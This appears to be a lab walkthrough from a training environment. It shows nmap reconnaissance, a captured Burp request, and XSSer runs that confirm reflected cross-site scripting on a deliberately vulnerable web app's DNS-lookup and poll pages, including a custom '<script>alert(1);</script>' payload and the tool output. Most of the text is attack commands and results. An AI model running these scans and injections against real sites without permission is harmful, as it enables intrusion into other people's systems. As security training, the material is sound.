- Check you IP address and then target the IP adjacent to your IP address

```
root@attackdefense:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: ip_vti0@NONE: <NOARP> mtu 1480 qdisc noop state DOWN group default qlen 1000
    link/ipip 0.0.0.0 brd 0.0.0.0
36656: eth0@if36657: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:0a:01:00:03 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.1.0.3/16 brd 10.1.255.255 scope global eth0
       valid_lft forever preferred_lft forever
36659: eth1@if36660: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:c0:28:7a:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 192.40.122.2/24 brd 192.40.122.255 scope global eth1
       valid_lft forever preferred_lft forever
root@attackdefense:~# nmap -sV 192.40.122.3
Starting Nmap 7.70 ( https://nmap.org ) at 2023-08-30 21:33 IST
Nmap scan report for target-1 (192.40.122.3)
Host is up (0.0000090s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
3306/tcp open  mysql   MySQL 5.5.47-0ubuntu0.14.04.1
MAC Address: 02:42:C0:28:7A:03 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.63 seconds
```

Launch browser and visit the same IP address so we can see the webapp in this scenario our goal is to see if we will be able to run our own javascript

Once again we will launch the burp and see the request in proxy tab

```
POST /index.php?page=dns-lookup.php HTTP/1.1
Host: 192.40.122.3
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.40.122.3/index.php?page=dns-lookup.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Connection: close
Cookie: PHPSESSID=a2fcdmitfdu5mpft8l8ac3spu6; showhints=1
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

target_host=google.com&dns-lookup-php-submit-button=Lookup+DNS
```

We will be using XSSER to see if the webapp is vulnerable to the cross site scripting and the command for that is `xsser --url "{CompleteUrlToTheSearchResult}" -p "{TheRequestDataFromBurpModifiedWithXSSInplaceOfSearchWord}"`

```
root@attackdefense:~# xsser --url "http://192.40.122.3//index.php?page=dns-lookup.php" -p "target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS"
===========================================================================

XSSer v1.8[2]: "The Hiv3!" - (https://xsser.03c8.net) - 2010/2019 -> by psy

===========================================================================
Testing [XSS from URL]...
===========================================================================
===========================================================================
[*] Test: [ 1/1 ] <-> 2023-08-30 21:39:11.857338
===========================================================================

[+] Target: 

 [ http://192.40.122.3//index.php?page=dns-lookup.php ]

---------------------------------------------

[!] Hashing: 

 [ 99cd6176b0b9a90124bfcd2d3dee85d1 ] : [ target_host ]

---------------------------------------------

[*] Trying: 

http://192.40.122.3//index.php?page=dns-lookup.php (POST: target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS)

---------------------------------------------

[+] Vulnerable(s): 

 [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]

---------------------------------------------

=============================================
[*] Injection(s) Results:
=============================================

 [ FOUND! ] -> [ 99cd6176b0b9a90124bfcd2d3dee85d1 ] : [ target_host ] -> [ ">PAYLOAD ]

==================================================
Mosquito(es) landed!
==================================================

===========================================================================
[*] Final Results:
===========================================================================

- Injections: 1
- Failed: 0
- Successful: 1
- Accur: 100.0 %

===========================================================================
[*] List of XSS injections:
===========================================================================

You have found: [ 1 ] possible (without --reverse-check) XSS vector(s)!

---------------------

[+] Target: http://192.40.122.3//index.php?page=dns-lookup.php | target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS
[+] Vector: [ target_host ]
[!] Method: URL
[*] Hash: 99cd6176b0b9a90124bfcd2d3dee85d1
[*] Payload: target_host=%22%3E99cd6176b0b9a90124bfcd2d3dee85d1&dns-lookup-php-submit-button=Lookup+DNS
[!] Vulnerable: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
[!] Status: XSS FOUND! 
 --------------------------------------------------
```

If we want to test for all possible scripts we can attach a --auto flag at the end of the previous command. In this scenario the application seems to be vulnerable to all the possible outcomes.

```
xsser --url "http://192.40.122.3//index.php?page=dns-lookup.php" -p "target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS" --auto
```

```
[*] Final Results:
===========================================================================

- Injections: 1291
- Failed: 0
- Successful: 1291
- Accur: 100.0 %
```

Trying to run a custom payload and see if we can get the output for this we use the flag --Fp

```
root@attackdefense:~# xsser --url "http://192.40.122.3//index.php?page=dns-lookup.php" -p "target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS" --Fp "<script>alert(1);</script>"
```

```
[*] Final Results:
===========================================================================

- Injections: 1
- Failed: 0
- Successful: 1
- Accur: 100.0 %

===========================================================================
[*] List of XSS injections:
===========================================================================

You have found: [ 1 ] possible (without --reverse-check) XSS vector(s)!

---------------------

[+] Target: http://192.40.122.3//index.php?page=dns-lookup.php | target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS
[+] Vector: [ target_host ]
[!] Method: URL
[*] Hash: b420eb041d822a94b298e38485ba4fc2
[*] Payload: target_host=%22%3Eb420eb041d822a94b298e38485ba4fc2&dns-lookup-php-submit-button=Lookup+DNS
[!] Vulnerable: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
[*] Final Attack: target_host=%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&dns-lookup-php-submit-button=Lookup+DNS
[!] Status: XSS FOUND!
```

Even with the custom payload script we are able to get the output

Trying to see for another url that is of post in poll also similary we can use the --Fp script as well

`root@attackdefense:~# xsser --url "http://192.40.122.3/index.php?page=user-poll.php&csrf-token=&choice=XSS&initials=&user-poll-php-submit-button=Submit+Vote"`